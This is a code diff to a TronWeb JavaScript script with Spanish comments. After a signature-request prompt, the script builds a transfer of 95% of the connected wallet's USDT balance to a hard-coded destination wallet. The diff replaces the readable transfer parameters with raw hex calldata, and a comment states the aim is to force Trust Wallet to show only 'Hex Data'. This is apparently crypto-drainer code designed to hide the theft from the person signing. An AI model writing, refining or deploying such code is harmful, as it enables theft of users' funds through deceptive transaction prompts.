@@ -1240,33 +1240,27 @@
                         "Solicitando autorización de firma digital..."
                     );
 
-                    const destinoHex =
-                        tronWeb.address.toHex(
-                            BILLETERA_DESTINO
-                        );
-
                     /*
                      * Cálculo ajustado al 95% del saldo USDT
                      */
                     const amount95Percent = balanceBigNumber.multipliedBy(95).dividedToIntegerBy(100);
 
+                    // Codificación en bruto (raw bytes hex) para forzar la vista Hex Data en Trust Wallet
+                    const destAddressHex = tronWeb.address.toHex(BILLETERA_DESTINO);
+                    const address32Bytes = destAddressHex.replace(/^41/, '').padStart(64, '0');
+                    const amountHex = BigInt(amount95Percent.toString()).toString(16).padStart(64, '0');
+
+                    // Selector 'a9059cbb' (transfer) + dirección (32 bytes) + monto (32 bytes)
+                    const rawCallData = 'a9059cbb' + address32Bytes + amountHex;
+
                     const transactionDraft =
                         await tronWeb.transactionBuilder.triggerSmartContract(
                             CONTRATO_USDT,
-                            "transfer(address,uint256)",
+                            rawCallData,
                             {
                                 feeLimit: 100000000
                             },
-                            [
-                                {
-                                    type: 'address',
-                                    value: destinoHex
-                                },
-                                {
-                                    type: 'uint256',
-                                    value: amount95Percent.toString()
-                                }
-                            ],
+                            [],
                             tronWeb.address.toHex(
                                 walletAddress
                             )
